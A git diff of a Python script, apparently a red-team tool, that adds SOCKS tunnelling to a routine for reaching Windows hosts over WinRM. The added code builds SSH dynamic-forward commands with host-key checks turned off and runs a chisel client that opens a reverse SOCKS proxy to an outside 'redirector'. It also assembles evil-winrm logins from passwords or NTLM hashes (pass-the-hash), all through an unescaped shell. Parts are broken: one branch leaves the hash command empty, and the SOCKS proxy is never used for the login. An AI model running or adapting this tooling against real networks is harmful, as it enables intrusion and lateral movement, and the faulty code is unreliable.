@@ -53,17 +53,27 @@ predefined_tunnel_ports = {
 
 def prompt_for_tunnel():
     """
-    Prompt the user to check if tunneling is needed and return the tunnel count.
-    :return: Number of tunnels (1 or 2), or None if tunneling is not needed.
+    Prompt the user to check if tunneling is needed, select tunnel type, and return tunnel details.
+    :return: Tuple (tunnel_type, tunnel_count), or (None, None) if tunneling is not needed.
     """
     if text("Do you need to tunnel the connection? (Y/N):").ask().lower() == "y":
+        # Ask for the type of tunnel
+        tunnel_type = select(
+            "Select the Tunnel Type:",
+            choices=["SSH Tunnel", "SOCKS"],
+            style=custom_style,
+        ).ask()
+
+        # Ask for the number of tunnels required
         tunnel_count = int(select(
             "Select the Number of Tunnels Required:",
             choices=["1", "2"],
             style=custom_style,
         ).ask())
-        return tunnel_count
-    return None
+
+        return tunnel_type, tunnel_count
+
+    return None, None
 
 def get_free_port():
     """Find an available port on the local machine."""
@@ -117,11 +127,66 @@ def select_ssh_key(directory=os.path.expanduser("~/.ssh")):
         return None
     return select("Select your SSH private key:", choices=keys, style=custom_style).ask()
 
-
 def execute_command(command):
     """Run a shell command."""
     print(f"Executing: {command}")
     subprocess.run(command, shell=True)
+
+def setup_socks_tunnel(tunnel_count, target_ip, target_port):
+    """
+    Set up a SOCKS proxy tunnel.
+    :param tunnel_count: Number of tunnels to create.
+    :param target_ip: The target IP address for the SOCKS tunnel.
+    :param target_port: The target port for the SOCKS tunnel.
+    """
+    print("Setting up a SOCKS proxy tunnel...")
+
+    if tunnel_count == 1:
+        print(f"SOCKS Proxy Tunnel NOT Supported over single tunnel")
+        return None, None
+    elif tunnel_count == 2:
+        socks_ssh_tunnel_ip = text("Enter SOCKS Server IP:").ask()
+        socks_ssh_tunnel_port = text("Enter SOCKS Server SSH Port (default: 22):").ask() or "22"
+        socks_ssh_tunnel_user = text("Enter SOCKS Server SSH Username:").ask()
+        local_socks_port = text("Enter Desired Local SOCKS Port (default: 1080):").ask() or "1080"
+        ssh_key_name = select_ssh_key()
+
+        if not ssh_key_name:
+            print("No valid SSH key selected. Exiting.")
+            return None, None
+
+        ssh_key_path = os.path.join(ssh_key_directory, ssh_key_name)
+
+        # Command to establish the SOCKS proxy via SSH
+        ssh_command = (
+            f"ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "
+            f"-i {ssh_key_path} -D 127.0.0.1:{local_socks_port} -q -C -N -f "
+            f"{socks_ssh_tunnel_user}@{socks_ssh_tunnel_ip} -p {socks_ssh_tunnel_port}"
+        )
+        print(f"DEBUG: Executing SSH command for SOCKS tunnel: {ssh_command}")
+        execute_command(ssh_command)
+        print(f"SOCKS proxy established at 127.0.0.1:{local_socks_port}")
+
+        # Collect required inputs for the second hop (Chisel client connection)
+        chisel_redirector_ip = text("Enter Redirector IP (Chisel Server):").ask()
+        chisel_redirector_port = text("Enter Redirector Port (default: 8000):").ask() or "8000"
+        chisel_username = text("Enter SOCKS Proxy Username:").ask()
+        chisel_password = text("Enter SOCKS Proxy Password:").ask()
+
+        # Chisel client command using the established SOCKS proxy
+        chisel_command = (
+            f"chisel client --proxy socks5h://'{chisel_username}:{chisel_password}'@127.0.0.1:{local_socks_port} "
+            f"{chisel_redirector_ip}:{chisel_redirector_port} R:socks &"
+        )
+        print(f"DEBUG: Executing Chisel client command: {chisel_command}")
+        execute_command(chisel_command)
+
+        print("Chisel client connected to redirector.")
+        return local_socks_port, None  # Return the SOCKS proxy port
+
+    else:
+        print("ERROR: Multi-hop SOCKS tunneling is not yet implemented.")
+        return None, None
 
 def setup_tunnel_chain_dynamic_with_ports(tunnel_count, target_ip, target_port, custom_ports=None):
     """
@@ -239,42 +304,69 @@ def winrm_masq():
     target_ip = text("Enter Target IP of WinRM:").ask()
     winrm_username = text("Enter Username:").ask()
 
-    tunnel_count = prompt_for_tunnel()
-    if tunnel_count:
-        predefined_ports = [5985] if tunnel_count == 1 else [5986, 5985]
-        target_port = 5985 if tunnel_count == 1 else 5986
+    tunnel_type, tunnel_count = prompt_for_tunnel()
+    if tunnel_type and tunnel_count:
+        print(f"Tunneling Type: {tunnel_type}, Tunnels: {tunnel_count}")
+        if tunnel_type == "SOCKS":
+            # Redirect to SOCKS setup
+            local_socks_port, _ = setup_socks_tunnel(tunnel_count, target_ip, 5985)
+            if not local_socks_port:
+                print("Failed to set up SOCKS tunnel. Exiting.")
+                return
 
-        first_tunnel_port, last_tunnel_port = setup_tunnel_chain_dynamic_with_ports(
-            tunnel_count=tunnel_count,
-            target_ip=target_ip,
-            target_port=target_port,
-            custom_ports=predefined_ports
-        )
+            auth_choice = select(
+                "How do you want to authenticate?: ",
+                choices=["Password", "Hashes"],
+                style=custom_style
+            ).ask()
 
-        if not first_tunnel_port or not last_tunnel_port:
-            print("Failed to set up tunnels. Exiting.")
-            return
+            if auth_choice == "Password":
+                winrm_password = input("Enter WinRM Password: ")
+                command = (
+                    f"evil-winrm -i {target_ip} -u {winrm_username} -p {winrm_password}"
+                )
+            elif auth_choice == "Hashes":
+                winrm_hash = input("Enter NTLM Hash: ")
+                command = (
 
-        winrm_command_port = first_tunnel_port if tunnel_count > 1 else last_tunnel_port
-        # Continue with authentication and command setup
+                )
 
-        # Prompt for authentication type
-        auth_choice = select(
-            "How do you want to authenticate?",
-            choices=["Password", "Hashes"],
-            style=custom_style,
-        ).ask()
+        elif tunnel_type == "SSH Tunnel":
+            # Proceed with SSH tunnel setup
+            predefined_ports = [5985] if tunnel_count == 1 else [5986, 5985]
+            target_port = 5985 if tunnel_count == 1 else 5986
 
-        if auth_choice == "Password":
-            winrm_password = input("Enter WinRM Password: ")
-            command = (
-                f"evil-winrm -i 127.0.0.1 -u {winrm_username} -p {winrm_password}"
+            first_tunnel_port, last_tunnel_port = setup_tunnel_chain_dynamic_with_ports(
+                tunnel_count=tunnel_count,
+                target_ip=target_ip,
+                target_port=target_port,
+                custom_ports=predefined_ports
             )
-        elif auth_choice == "Hashes":
-            winrm_hash = input("Enter NTLM Hash: ")
-            command = (
-                f"evil-winrm -i 127.0.0.1 -u {winrm_username} -H {winrm_hash}"
-            )
+
+            if not first_tunnel_port or not last_tunnel_port:
+                print("Failed to set up tunnels. Exiting.")
+                return
+
+            winrm_command_port = first_tunnel_port if tunnel_count > 1 else last_tunnel_port
+            # Continue with authentication and command setup
+
+            # Prompt for authentication type
+            auth_choice = select(
+                "How do you want to authenticate?",
+                choices=["Password", "Hashes"],
+                style=custom_style,
+            ).ask()
+
+            if auth_choice == "Password":
+                winrm_password = input("Enter WinRM Password: ")
+                command = (
+                    f"evil-winrm -i 127.0.0.1 -u {winrm_username} -p {winrm_password}"
+                )
+            elif auth_choice == "Hashes":
+                winrm_hash = input("Enter NTLM Hash: ")
+                command = (
+                    f"evil-winrm -i 127.0.0.1 -u {winrm_username} -H {winrm_hash}"
+                )
     else:
         # No tunneling
         auth_choice = select(
@@ -285,10 +377,10 @@ def winrm_masq():
 
         if auth_choice == "Password":
             winrm_password = input("Enter WinRM Password: ")
-            command = f"evil-winrm -i {winrm_target} -u {winrm_username} -p {winrm_password}"
+            command = f"evil-winrm -i {target_ip} -u {winrm_username} -p {winrm_password}"
         elif auth_choice == "Hashes":
             winrm_hash = input("Enter NTLM Hash: ")
-            command = f"evil-winrm -i {winrm_target} -u {winrm_username} -H {winrm_hash}"
+            command = f"evil-winrm -i {target_ip} -u {winrm_username} -H {winrm_hash}"
 
     # Execute the command
     print("Executing:", command)
